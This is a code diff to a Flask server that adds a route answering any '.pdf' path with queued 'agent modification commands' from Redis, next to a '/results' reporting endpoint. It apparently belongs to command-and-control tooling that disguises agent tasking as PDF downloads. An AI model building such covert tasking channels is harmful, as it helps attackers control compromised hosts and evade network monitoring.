@@ -181,6 +181,30 @@ class FlaskApplication:
 
         # TODO: Key exchange route and endpoint
 
+        @self.app.route("/<path:filename>.pdf", methods=["GET"])
+        def handle_agent_modification_command_request(filename):
+            # Get agent modification commands if they are available
+            commands = command.get_queued_agent_modification_commands(self.domain, self.redis_client)
+
+            if commands:
+                # Decode bytes to strings if needed
+                decoded_commands = [
+                    cmd.decode("utf-8") if isinstance(cmd, bytes) else cmd
+                    for cmd in commands
+                ]
+                return (
+                    jsonify(
+                        {
+                            "commands": decoded_commands,
+                        }
+                    ),
+                    200,
+                )
+
+            else:
+                # TODO: IN the future this can implement a timer of shorts that is sent back
+                return jsonify(status="No data available"), 404
+
         @self.app.route("/results", methods=["POST"])
         def reportChunk():
             """
